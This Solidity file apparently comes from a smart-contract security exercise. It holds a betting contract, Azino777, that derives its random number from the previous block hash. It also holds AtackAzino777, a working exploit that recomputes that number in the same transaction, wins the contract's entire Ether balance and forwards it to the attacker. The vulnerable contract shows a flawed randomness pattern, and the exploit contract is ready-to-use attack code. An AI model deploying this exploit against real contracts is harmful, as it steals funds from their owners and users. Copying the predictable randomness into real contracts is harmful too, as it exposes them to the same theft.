// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Azino777 {

    uint256 private constant FACTOR =
        1157920892373161954235709850086879078532699846656405640394575840079131296399;

    event Received(address, uint256);

    function spin(uint256 bet) public payable {              

        require(msg.value >= 0.01 ether);               
        
        uint256 num = rand(100);        

        if (num == bet) {          
            
            //(bool sent, bytes memory data) = payable(msg.sender).call{value : msg.value}("");
            //console.log(address(this).balance);        

            //payable(msg.sender).transfer(address(this).balance);

            //payable(msg.sender).transfer(0.1 ether);


           (bool succes, ) =  payable(msg.sender).call{value : address(this).balance}("");
            require(succes, "Failed to send Ether");

            
            //console.log(succes);      

            //require(sent, "Failed to send ether");
        }
    }

    function rand(uint256 max) private view returns (uint256 result) {
        uint256 factor = (FACTOR * 100) / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    receive() external payable {   
    }
}


contract AtackAzino777{


    Azino777 victim;

    uint256 private constant FACTOR =
        1157920892373161954235709850086879078532699846656405640394575840079131296399;

    address private ownerAtack;    

    uint256 private constant max = 100;

        constructor (address payable contractAtack){
            victim = Azino777(contractAtack);          
            ownerAtack = msg.sender;
        }


    function rand() public payable {                
      

        uint256 factor = (FACTOR * 100) / max;
        uint256 lastBlockNumber = block.number - 1;
        uint256 hashVal = uint256(blockhash(lastBlockNumber));

        uint256 random = uint256((uint256(hashVal) / factor)) % max;

        victim.spin{value:msg.value}(random);
    }

    receive() external payable {
        //console.log("antes: " , ownerAtack.balance);
        (bool succes, ) =  payable(ownerAtack).call{value : msg.value}("");
        require(succes, "Failed to send Ether");
        //console.log("despues: " , ownerAtack.balance);
    }

    function owner() public view returns(address){
        return ownerAtack;
    }
}


